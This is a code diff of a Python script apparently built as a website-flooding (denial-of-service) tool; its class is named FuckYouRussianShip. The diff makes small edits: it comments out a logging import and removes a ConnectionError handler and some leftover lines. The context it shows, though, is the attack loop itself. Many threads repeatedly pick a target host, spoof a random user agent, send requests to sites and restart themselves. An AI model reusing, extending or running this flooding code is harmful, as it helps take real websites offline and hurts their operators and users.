@@ -1,11 +1,10 @@
 # -*- coding: utf-8 -*-
 from argparse import ArgumentParser
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from loguru import logger
+# from loguru import logger
 from os import system
 from pyuseragents import random as random_useragent
 from random import choice
-from requests.exceptions import ConnectionError
 from sys import stderr
 from threading import Thread
 from time import sleep
@@ -98,7 +97,6 @@ class FuckYouRussianShip:
         global threads_count
         threads_count += 1
 
-        # log_file_main = 'main'
         while True:
             scraper = self.init_scraper()
             host = choice(self.HOSTS)
@@ -139,20 +137,14 @@ class FuckYouRussianShip:
                         response = scraper.get(site, timeout=10)
                         self.write_statistic_success(site, response.status_code)
                         del response
-            except ConnectionError:
-                self.write_statistic_error(site)
-                continue
             except Exception:
                 self.write_statistic_error(site)
-                continue
             finally:
                 threads_count -= 1
                 del scraper
                 del host
                 del data
                 del site
-                # del log_file_main
-                # del log_file_name
                 return self.mainth()
 
     @staticmethod
